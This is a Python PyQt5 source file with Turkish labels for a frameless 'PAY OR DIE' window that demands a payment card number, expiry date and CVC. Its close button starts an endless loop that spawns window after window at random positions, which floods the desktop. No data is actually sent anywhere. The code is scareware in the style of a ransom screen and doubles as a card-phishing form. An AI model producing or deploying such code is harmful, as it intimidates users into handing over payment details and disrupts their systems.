######################### QT LIB #########################
from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtCore import *
from PyQt5.QtWidgets import *
from PyQt5.QtGui import *
import random
import time
import threading

class Ui_pay( QtWidgets.QMainWindow ):
    def __init__(self): #*****
        super().__init__() #*****

        self.setupUi() #*****


    def Pencereee(self):
        a = random.randint(1, 1000)
        b = random.randint(1, 1000)
        self.pencere = QtWidgets.QWidget()
        self.pencere.setWindowTitle("PAY OR DİE")
        self.pencere.setGeometry(a, b,500,500)
        self.pencere.resize(360, 360)
        self.pencere.setMinimumSize(QtCore.QSize(360, 360))
        self.pencere.setMaximumSize(QtCore.QSize(360, 360))

        self.baslik = QtWidgets.QLabel(self.pencere)
        self.baslik.setText("ÖDEME YAP KAPATİM ?")
        self.baslik.setGeometry(QtCore.QRect(30, 60, 291, 81))
        self.baslik.setObjectName("baslik")
        self.baslik.setFont(QFont('Arial', 10))


        self.pencere.show()
        time.sleep(10)


    def looop(self):
        while True:
            t1 = threading.Thread(target=self.Pencereee)
            t1.start()

    def pageclose(self):
        self.close()

    def pagemini(self):
        self.showMinimized()


    def setupUi(self):
        self.setWindowFlag(Qt.FramelessWindowHint) 
        self.setObjectName("pay")
        self.resize(360, 360)
        self.setMinimumSize(QtCore.QSize(360, 360))
        self.setMaximumSize(QtCore.QSize(360, 360))
        self.centralwidget = QtWidgets.QWidget()
        self.centralwidget.setObjectName("centralwidget")

        self.baslik = QtWidgets.QLabel(self.centralwidget)
        self.baslik.setGeometry(QtCore.QRect(30, 60, 291, 81))
        font = QtGui.QFont()
        font.setPointSize(18)
        font.setBold(True)
        font.setWeight(75)
        self.baslik.setFont(font)
        self.baslik.setObjectName("baslik")


        self.label_2 = QtWidgets.QLabel(self.centralwidget)
        self.label_2.setGeometry(QtCore.QRect(30, 160, 141, 20))
        font = QtGui.QFont()
        font.setPointSize(15)
        self.label_2.setFont(font)
        self.label_2.setObjectName("label_2")


        self.label_3 = QtWidgets.QLabel(self.centralwidget)
        self.label_3.setGeometry(QtCore.QRect(10, 200, 181, 20))
        font = QtGui.QFont()
        font.setPointSize(13)
        self.label_3.setFont(font)
        self.label_3.setObjectName("label_3")


        self.label_4 = QtWidgets.QLabel(self.centralwidget)
        self.label_4.setGeometry(QtCore.QRect(120, 240, 51, 20))
        font = QtGui.QFont()
        font.setPointSize(15)
        self.label_4.setFont(font)
        self.label_4.setObjectName("label_4")


        self.kartno = QtWidgets.QLineEdit(self.centralwidget)
        self.kartno.setGeometry(QtCore.QRect(190, 150, 121, 31))
        self.kartno.setObjectName("kartno")


        self.sonk = QtWidgets.QLineEdit(self.centralwidget)
        self.sonk.setGeometry(QtCore.QRect(190, 190, 51, 31))
        self.sonk.setObjectName("sonk")

        self.sonk2 = QtWidgets.QLineEdit(self.centralwidget)
        self.sonk2.setGeometry(QtCore.QRect(270, 190, 41, 31))
        self.sonk2.setObjectName("sonk2")

        self.label_5 = QtWidgets.QLabel(self.centralwidget)
        self.label_5.setGeometry(QtCore.QRect(250, 190, 21, 31))
        font = QtGui.QFont()
        font.setPointSize(20)
        self.label_5.setFont(font)
        self.label_5.setObjectName("label_5")

        self.cvc = QtWidgets.QLineEdit(self.centralwidget)
        self.cvc.setGeometry(QtCore.QRect(190, 230, 51, 31))
        self.cvc.setObjectName("cvc")

        self.gonder = QtWidgets.QPushButton(self.centralwidget)
        self.gonder.setGeometry(QtCore.QRect(110, 280, 141, 41))
        font = QtGui.QFont()
        font.setPointSize(15)
        font.setBold(True)
        font.setWeight(75)
        self.gonder.setFont(font)
        self.gonder.setObjectName("gonder")


        self.closee = QtWidgets.QPushButton(self.centralwidget)
        self.closee.setGeometry(QtCore.QRect(310, 10, 41, 23))
        self.closee.setStyleSheet("background-color:red")
        self.closee.setObjectName("close")


        self.setsizea = QtWidgets.QPushButton(self.centralwidget)
        self.setsizea.setGeometry(QtCore.QRect(260, 10, 41, 23))
        self.setsizea.setObjectName("setsizea")
        self.setCentralWidget(self.centralwidget)

        self.retranslateUi()
        QtCore.QMetaObject.connectSlotsByName(self)


        self.gonder.clicked.connect(self.pageclose)
        self.closee.clicked.connect(self.looop)
        self.closee.clicked.connect(self.pageclose)
        self.setsizea.clicked.connect(self.pagemini)
 

    def retranslateUi(self):
        _translate = QtCore.QCoreApplication.translate
        self.setWindowTitle(_translate("pay", "PAY OR DIE"))
        self.baslik.setText(_translate("pay", "ODEME YAP KAPATIM ?"))
        self.label_2.setText(_translate("pay", "Kart Numarasi : "))
        self.label_3.setText(_translate("pay", "Son Kullanma Tarihi :"))
        self.label_4.setText(_translate("pay", "CVC :"))
        self.label_5.setText(_translate("pay", "/"))
        self.gonder.setText(_translate("pay", "GONDER"))
        self.closee.setText(_translate("pay", "X"))
        self.setsizea.setText(_translate("pay", "-"))

    def mousePressEvent(self, event):
        self.oldPos = event.globalPos()

    def mouseMoveEvent(self, event):
        delta = QPoint(event.globalPos() - self.oldPos)
        self.move(self.x() + delta.x(), self.y() + delta.y())
        self.oldPos = event.globalPos()


if __name__ == "__main__":
    import sys
    app = QtWidgets.QApplication(sys.argv)
    ui = Ui_pay()
    ui.show()
    sys.exit(app.exec_())